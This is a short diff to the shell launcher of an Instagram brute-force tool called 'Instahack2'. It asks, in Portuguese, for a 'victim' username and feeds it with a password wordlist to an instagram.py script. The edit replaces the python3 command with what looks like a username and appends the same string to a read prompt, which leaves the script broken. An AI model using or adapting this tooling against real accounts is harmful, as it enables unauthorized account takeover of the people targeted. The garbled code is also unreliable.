@@ -30,13 +30,15 @@ clear
 figlet Instahack2
 echo "\033[1;32m\n\n[+]=>DIGITE OU COLE O NOME DA VÍTIMA exe:(pedro1234)"
 #
-read -p "[+]=>" vitima
+read -p "[+]=>" vitima ulissesdasilva340
+
 #
 #Iniciando o ataque
 clear
 figlet START
 pip3 install -r requirements.txt
-python3 instagram.py $vitima /$HOME/instahack2/Brute-Force/wordlist/wordlist.txt -m 3
+Ulissesdasilva340 instagram.py $vitima /$HOME/instahack2/Brute-Force/wordlist/wordlist.txt -m 3
 fi
 exit
+
 
